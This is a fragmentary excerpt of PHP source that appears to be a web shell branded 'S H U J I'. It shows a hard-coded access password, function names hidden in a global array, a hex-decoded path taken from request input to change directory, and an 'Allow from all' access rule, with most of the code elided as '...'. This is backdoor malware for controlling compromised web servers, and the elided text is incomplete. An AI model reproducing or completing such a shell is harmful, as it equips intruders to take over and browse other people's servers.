...
// $GLOBALS['fungsi'][0]
	...
	$gcw = "getcwd";
	$correctPassword = "shujifine"; //Change Password
	if (isset($_POST['pass'])) {
	...
	<head>
		...
		<meta charset='UTF-8'>
		<meta name='author' content='S H U J I'>
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>S H U J I</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
...
Allow from all
		...
		</div><div class='text-secondary'>&copy S H U J I</div>
	</div>
</div>
</body>
</html>